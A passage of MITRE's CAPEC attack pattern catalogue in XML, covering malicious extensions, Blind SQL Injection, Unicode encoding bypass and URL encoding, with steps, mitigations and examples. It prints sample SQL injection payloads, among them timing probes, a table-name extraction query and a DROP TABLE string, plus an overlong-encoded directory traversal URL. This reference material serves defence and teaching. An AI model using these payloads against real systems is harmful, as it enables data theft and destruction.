               <ns0:Description>[Create malicious extension] Having identified a suitable target, the adversary crafts a malicious extension/plugin that can be installed by the underlying target software. This malware may be targeted to execute on specific operating systems or be operating system agnostic.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Install malicious extension] The malicious extension/plugin is installed by the underlying target software and executes the adversary-created malware, resulting in a variety of negative technical impacts.</ns0:Description>
               <ns0:Technique>Adversary-Installed: Having already compromised the target system, the adversary simply installs the malicious extension/plugin themself.</ns0:Technique>
               <ns0:Technique>User-Installed: The adversary tricks the user into installing the malicious extension/plugin, via means such as social engineering, or may upload the malware on a reputable extension/plugin hosting site and wait for unknowing victims to install the malicious component.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The adversary must craft malware based on the type of software and system(s) they intend to exploit.</ns0:Prerequisite>
            <ns0:Prerequisite>If the adversary intends to install the malicious extension themself, they must first compromise the target machine via some other means.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">Ability to create malicious extensions that can exploit specific software applications and systems.</ns0:Skill>
            <ns0:Skill Level="Medium">Optional: Ability to exploit target system(s) via other means in order to gain entry.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Impact>Alter Execution Logic</ns0:Impact>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Only install extensions/plugins from official/verifiable sources.</ns0:Mitigation>
            <ns0:Mitigation>Confirm extensions/plugins are legitimate and not malware masquerading as a legitimate extension/plugin.</ns0:Mitigation>
            <ns0:Mitigation>Ensure the underlying software leveraging the extension/plugin (including operating systems) is up-to-date.</ns0:Mitigation>
            <ns0:Mitigation>Implement an extension/plugin allow list, based on the given security policy.</ns0:Mitigation>
            <ns0:Mitigation>If applicable, confirm extensions/plugins are properly signed by the official developers.</ns0:Mitigation>
            <ns0:Mitigation>For web browsers, close sessions when finished to prevent malicious extensions/plugins from executing the the background.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>In January 2018, Palo Alto's Unit 42 reported that a malicious Internet Information Services (IIS) extension they named RGDoor was used to create a backdoor into several Middle Eastern government organizations, as well as a financial institution and an educational institution. This malware was used in conjunction with the TwoFace webshell and allowed the adversaries to upload/download files and execute unauthorized commands. [REF-740]</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:p>In December 2018, it was reported that North Korea-based APT Kimusky (also known as Velvet Chollima) infected numerous legitimate academic organizations within the U.S., many specializing in biomedical engineering, with a malicious Google Chrome extension. Dubbed "Operation STOLEN PENCIL", the attack entailed conducting spear-phishing attacks to trick victims into installing a malicious PDF reader named "Auto Font Manager". Once installed, the malware allowed adversaries to steal cookies and site passwords, as well as forward emails from some compromised accounts. [REF-741]</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="507" />
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1176</ns0:Entry_ID>
               <ns0:Entry_Name>Browser Extensions</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1505.004</ns0:Entry_ID>
               <ns0:Entry_Name>Server Software Component: IIS Components</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-740" />
            <ns0:Reference External_Reference_ID="REF-741" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2022-09-29</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="7" Name="Blind SQL Injection" Abstraction="Detailed" Status="Draft">
         <ns0:Description>Blind SQL Injection results from an insufficient mitigation for SQL Injection. Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages. Without the error messages that facilitate SQL Injection, the adversary constructs input strings that probe the target through simple Boolean SQL expressions. The adversary can determine if the syntax and structure of the injection was successful based on whether the query was executed or not. Applied iteratively, the adversary determines how and where the target is vulnerable to SQL Injection.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="66" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Hypothesize SQL queries in application]<html:p>Generated hypotheses regarding the SQL queries in an application. For example, the adversary may hypothesize that their input is passed directly into a query that looks like:</html:p>
                  <html:div style="margin-left:1em;" class="informative">"SELECT * FROM orders WHERE ordernum = _____"<html:br />or<html:br />"SELECT * FROM orders WHERE ordernum IN (_____)"<html:br />or<html:br />"SELECT * FROM orders WHERE ordernum in (_____) ORDER BY _____"</html:div>
                  <html:p>Of course, there are many other possibilities.</html:p>
               </ns0:Description>
               <ns0:Technique>Research types of SQL queries and determine which ones could be used at various places in an application.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine how to inject information into the queries]<html:p>Determine how to inject information into the queries from the previous step such that the injection does not impact their logic. For example, the following are possible injections for those queries:</html:p>
                  <html:div style="margin-left:1em;" class="informative">"5' OR 1=1; --"<html:br />and<html:br />"5) OR 1=1; --"<html:br />and<html:br />"ordernum DESC; --"</html:div>
               </ns0:Description>
               <ns0:Technique>Add clauses to the SQL queries such that the query logic does not change.</ns0:Technique>
               <ns0:Technique>Add delays to the SQL queries in case server does not provide clear error messages (e.g. WAITFOR DELAY '0:0:10' in SQL Server or BENCHMARK(1000000000,MD5(1) in MySQL). If these can be injected into the queries, then the length of time that the server takes to respond reveals whether the query is injectable or not.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the adversary suspects is vulnerable to SQL injection, attempt to inject the values determined in the previous step. If an error does not occur, then the adversary knows that the SQL injection was successful.</ns0:Description>
               <ns0:Technique>Use web browser to inject input through text fields or through HTTP GET parameters.</ns0:Technique>
               <ns0:Technique>Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.</ns0:Technique>
               <ns0:Technique>Use network-level packet injection tools such as netcat to inject input</ns0:Technique>
               <ns0:Technique>Use modified client (modified by reverse engineering) to inject input.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Determine database type] Determines the type of the database, such as MS SQL Server or Oracle or MySQL, using logical conditions as part of the injected queries</ns0:Description>
               <ns0:Technique>Try injecting a string containing char(0x31)=char(0x31) (this evaluates to 1=1 in SQL Server only)</ns0:Technique>
               <ns0:Technique>Try injecting a string containing 0x313D31 (this evaluates to 1=1 in MySQL only)</ns0:Technique>
               <ns0:Technique>Inject other database-specific commands into input fields susceptible to SQL Injection. The adversary can determine the type of database that is running by checking whether the query executed successfully or not (i.e. whether the adversary received a normal response from the server or not).</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>5</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Extract information about database schema] Extract information about database schema by getting the database to answer yes/no questions about the schema.</ns0:Description>
               <ns0:Technique>Automatically extract database schema using a tool such as Absinthe.</ns0:Technique>
               <ns0:Technique>Manually perform the blind SQL Injection to extract desired information about the database schema.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>6</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Exploit SQL Injection vulnerability] Use the information obtained in the previous steps to successfully inject the database in order to bypass checks or modify, add, retrieve or delete data from the database</ns0:Description>
               <ns0:Technique>Use information about how to inject commands into SQL queries as well as information about the database schema to execute attacks such as dropping tables, inserting records, etc.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>SQL queries used by the application to store, retrieve or modify data.</ns0:Prerequisite>
            <ns0:Prerequisite>User-controllable input that is not properly validated by the application as part of SQL queries.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">Determining the database type and version, as well as the right number and type of parameters to the query being injected in the absence of error messages requires greater skill than reverse-engineering database error messages.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Indicators>
            <ns0:Indicator>The only indicators of successful Blind SQL Injection are the application or database logs that show similar queries with slightly differing logical conditions that increase in complexity over time. However, this requires extensive logging as well as knowledge of the queries that can be used to perform such injection and return meaningful information from the database.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Security by Obscurity is not a solution to preventing SQL Injection. Rather than suppress error messages and exceptions, the application must handle them gracefully, returning either a custom error page or redirecting the user to a default page, without revealing any information about the database or the application internals.</ns0:Mitigation>
            <ns0:Mitigation>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>An adversary may try entering something like "username' AND 1=1; --" in an input field. If the result is the same as when the adversary entered "username" in the field, then the adversary knows that the application is vulnerable to SQL Injection. The adversary can then ask yes/no questions from the database server to extract information from it. For example, the adversary can extract table names from a database using the following types of queries:</html:p>
               <html:div style="margin-left:1em;" class="informative">"username' AND ascii(lower(substring((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) &gt; 108".</html:div>
               <html:p>If the above query executes properly, then the adversary knows that the first character in a table name in the database is a letter between m and z. If it doesn't, then the adversary knows that the character must be between a and l (assuming of course that table names only contain alphabetic characters). By performing a binary search on all character positions, the adversary can determine all table names in the database. Subsequently, the adversary may execute an actual attack and send something like:</html:p>
               <html:div style="margin-left:1em;" class="informative">"username'; DROP TABLE trades; --</html:div>
            </ns0:Example>
            <ns0:Example>In the PHP application TimeSheet 1.1, an adversary can successfully retrieve username and password hashes from the database using Blind SQL Injection. If the adversary is aware of the local path structure, the adversary can also remotely execute arbitrary code and write the output of the injected queries to the local path. Blind SQL Injection is possible since the application does not properly sanitize the $_POST['username'] variable in the login.php file. See also: CVE-2006-4705</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="89" />
            <ns0:Related_Weakness CWE_ID="209" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="707" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Blind SQL Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases, Description, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="71" Name="Using Unicode Encoding to Bypass Validation Logic" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attacker may provide a Unicode string to a system component that is not Unicode aware and use that to circumvent the filter or cause the classifying mechanism to fail to properly understanding the request. That may allow the attacker to slip malicious data past the content filter and/or possibly cause the application to route the request incorrectly.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various Unicode encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.</ns0:Description>
               <ns0:Technique>Try to use Unicode encoding of content in Scripts in order to bypass validation routines.</ns0:Technique>
               <ns0:Technique>Try to use Unicode encoding of content in HTML in order to bypass validation routines.</ns0:Technique>
               <ns0:Technique>Try to use Unicode encoding of content in CSS in order to bypass validation routines.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Filtering is performed on data that has not be properly canonicalized.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">An attacker needs to understand Unicode encodings and have an idea (or be able to find out) what system components may not be Unicode aware.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>Unicode encoded data is passed to APIs where it is not expected</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Ensure that the system is Unicode aware and can properly process Unicode data. Do not make an assumption that data will be in ASCII.</ns0:Mitigation>
            <ns0:Mitigation>Ensure that filtering or input validation is applied to canonical data.</ns0:Mitigation>
            <ns0:Mitigation>Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>A very common technique for a Unicode attack involves traversing directories looking for interesting files. An example of this idea applied to the Web is</html:p>
               <html:div style="margin-left:1em;" class="informative">http://target.server/some_directory/../../../winnt</html:div>
               <html:p>In this case, the attacker is attempting to traverse to a directory that is not supposed to be part of standard Web services. The trick is fairly obvious, so many Web servers and scripts prevent it. However, using alternate encoding tricks, an attacker may be able to get around badly implemented request filters.</html:p>
               <html:p>In October 2000, an adversary publicly revealed that Microsoft's IIS server suffered from a variation of this problem. In the case of IIS, all the attacker had to do was provide alternate encodings for the dots and/or slashes found in a classic attack. The Unicode translations are</html:p>
               <html:div style="margin-left:1em;" class="informative">. yields C0 AE<html:br />/ yields C0 AF<html:br />\ yields C1 9C</html:div>
               <html:p>Using this conversion, the previously displayed URL can be encoded as</html:p>
               <html:div style="margin-left:1em;" class="informative">http://target.server/some_directory/%C0AE/%C0AE/%C0AE%C0AE/%C0AE%C0AE/winnt</html:div>See also: CVE-2000-0884</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="176" />
            <ns0:Related_Weakness CWE_ID="179" />
            <ns0:Related_Weakness CWE_ID="180" />
            <ns0:Related_Weakness CWE_ID="173" />
            <ns0:Related_Weakness CWE_ID="172" />
            <ns0:Related_Weakness CWE_ID="184" />
            <ns0:Related_Weakness CWE_ID="183" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="692" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Unicode Encoding</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow, Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="72" Name="URL Encoding" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack targets the encoding of the URL. An adversary can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>A URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE).</html:p>
            <html:p>For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An adversary will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL.</html:p>
            <html:p>It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc. The adversary could also subvert the meaning of the URL string request by encoding the data being sent to the server through a GET request. For instance an adversary may subvert the meaning of parameters used in a SQL request and sent through the URL string (See Example section).</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey web application for URLs with parameters] Using a browser, an automated tool or by inspecting the application, an adversary records all URLs that contain parameters.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe URLs to locate vulnerabilities] The adversary uses the URLs gathered in the "Explore" phase as a target list and tests parameters with different encodings of special characters to see how the web application will handle them.</ns0:Description>
               <ns0:Technique>Use URL encodings of special characters such as semi-colons, backslashes, or question marks that might be filtered out normally.</ns0:Technique>
               <ns0:Technique>Combine the use of URL encodings with other encoding techniques such as the triple dot and escape slashes.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Inject special characters into URL parameters] Using the information gathered in the "Experiment" phase, the adversary injects special characters into the URL using URL encoding. This can lead to path traversal, cross-site scripting, SQL injection, etc.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The application should accepts and decodes URL input.</ns0:Prerequisite>
            <ns0:Prerequisite>The application performs insufficient filtering/canonicalization on the URLs.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An adversary can try special characters in the URL and bypass the URL validation.</ns0:Skill>
            <ns0:Skill Level="Medium">The adversary may write a script to defeat the input filtering mechanism.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>If the first decoding process has left some invalid or denylisted characters, that may be a sign that the request is malicious.</ns0:Indicator>
            <ns0:Indicator>Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Resource Consumption</ns0:Impact>
               <ns0:Note>Denial of Service</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Refer to the RFCs to safely decode URL.</ns0:Mitigation>
            <ns0:Mitigation>Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.</ns0:Mitigation>
            <ns0:Mitigation>There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).</ns0:Mitigation>
            <ns0:Mitigation>Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.</ns0:Mitigation>
            <ns0:Mitigation>Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.</ns0:Mitigation>
            <ns0:Mitigation>Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)</ns0:Mitigation>
